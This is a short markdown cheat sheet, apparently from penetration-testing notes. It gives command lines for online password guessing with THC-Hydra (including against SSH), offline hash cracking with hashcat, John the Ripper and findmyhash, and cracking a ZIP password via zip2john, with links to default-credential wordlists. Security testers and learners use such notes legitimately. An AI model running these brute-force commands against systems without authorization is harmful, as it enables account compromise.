# Password Guessing/Cracking

1. **THC-Hydra**

        $ hydra -l username -P password_file.txt -s port -f ip_address request_method /path
        $ hydra -l john -P rockyou.txt -t 6 ssh://10.10.10.NNN

2. **HashCat**

        hashcat -a 0 -m 13100 ./hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force

3. **John the Ripper**

        john --format=PuTTY --fork=4 key.hash -w=./wordlist.txt

4. **findmyhash**
   Crack the password hash using [findmyhash](https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/findmyhash/findmyhash.py)

        python findmyhash.py MD5 -h “2d58e0637ec1e94cdfba3d1c26b67d01”

## Common Scenarios

1. **Password-Protected ZIP**
   Convert a password protected ZIP file into a compatible format using `zip2john` utility, to be able to crack its password using [john](https://www.openwall.com/john/) 

        $ zip2john backup.zip > hash
        $ sudo john hash --fork=4 -w=./rockyou.txt

2. **Password Hash** 

    * Create `password.txt` file in following format
    
            username:MD5HASHVALUEHERE

    * Crack the hash using [john](https://www.openwall.com/john/)

            john password.txt --format=raw-md5 --wordlist=dico --rules

## References

* http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
* https://tools.kali.org/password-attacks/hydra
* [Apache Tomcat Default Credentials - Dictionary Attack Payoad](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt)
* https://www.youtube.com/watch?v=EfqJCKWtGiU
* https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/
* https://www.youtube.com/watch?v=EfqJCKWtGiU
* https://pentesterlab.com/exercises/from_sqli_to_shell/course
* https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8
* https://code.google.com/archive/p/findmyhash/
